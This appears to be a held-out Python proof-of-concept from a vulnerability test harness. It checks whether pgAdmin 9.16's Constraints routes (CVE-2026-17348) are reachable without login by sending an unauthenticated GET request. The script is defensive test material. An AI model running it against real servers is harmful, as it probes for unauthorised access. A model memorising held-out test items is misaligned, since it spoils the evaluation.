#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-17348 residual exploit for pgadmin-cve-2026-17348.

The 9.16 CVE-2026-12046 fix added @pga_login_required to the two SQL
Editor routes but a follow-up sweep (commit 24fdcf0, fixed in 9.17) found
the same omission on the Constraints blueprint routes (nodes/proplist/
delete), preferences.get_all_cli, debugger.close and schema_diff.close.

Residual: GET /browser/constraints/nodes/<gid>/<sid>/<did>/<scid>/<tid>/
unauthenticated (CSRF token only). On 9.16 the route body runs and the
first get_nodes() call hits connection_manager(), which in SERVER mode
raises ObjectGone("Server not found.") for an unauthenticated user -> 410.
On 9.17 the @pga_login_required decorator bounces the request to the login
page (302) before the route body is reached.
"""
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import pgadm_util as u  # noqa: E402


def candidate(*, version="v1", flag="pcbflag"):
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.anonymous_session(version)
    r = s.get(
        u.BASE[version] + "/browser/constraints/nodes/1/1/1/1/1/", timeout=20,
        allow_redirects=False
    )
    return {
        "ok": u.is_reached(r),
        "status": r.status_code,
        "body": r.text[:200],
    }


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(json.dumps(candidate(version=v)))
